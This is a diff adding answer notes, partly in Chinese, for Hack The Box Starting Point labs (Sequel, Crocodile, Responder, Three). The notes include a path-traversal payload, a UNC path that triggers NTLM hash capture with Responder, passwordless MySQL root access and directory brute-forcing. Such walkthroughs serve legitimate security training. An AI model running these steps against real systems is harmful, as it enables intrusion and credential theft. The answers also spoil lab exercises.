@@ -67,7 +67,7 @@
 5. smbclient -L IP
 6. WorkShares
 7. get
-8. smbclient \\\\IP\\WorkShares
+8. ```smbclient \\\\IP\\WorkShares```
    多逛逛，多get，就會有flag了
 
 ## Redeemer
@@ -113,5 +113,66 @@
     ```
     flag和第11題答案就會出現了
 
+## Sequel
+1. nmap
+2. nmap -sC -T4
+3. -u
+4. root
+5. * 
+6. ;
+7. 連線
+   ```
+   mysql -h IP -u root
+   SHOW DATABASES;
+   ```
+   Ansewer:htb
+8. payload
+   ```
+   USE htb
+   SELECT * FROM config;
+   ```
+## Crocodile
+1. -sC
+2. nmap -sV -sC IP
+3. 230
+4. anonymous
+5. get
+6. admin
+7. Apache httpd 2.4.41
+8. -x
+   ```
+   gobuster dir --url 網址 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php.html
+   ```
+9. login.php
+10. 登入
+    ![](asserts/picture1.png)
+
+## Responder
+1. unika.htb
+2. php
+3. 連線
+   linux:
+      ```
+      echo "ip unika.htb" |sudo tee -a /etc/hosts
+      ```
+   Answer:page
+4. ../../../../../../../../windows/system32/drivers/etc/hosts
+5. //10.10.14.6/somefile
+6. New Technology LAN Manager
+7. -I
+   ```
+   sudo responder -I tun0
+   ```
+8. John the Ripper
+9.  badminton
+10. netstat -aon
+11. ```type C:\Users\mike\Desktop\flag.txt ```
+
+## Three
+1. nmap -sT -sV -sC
+2. thetoppers.htb
+3. /etxc/hosts
+4. s3.thetoppers.htb
+5. 
 
 # Tier2
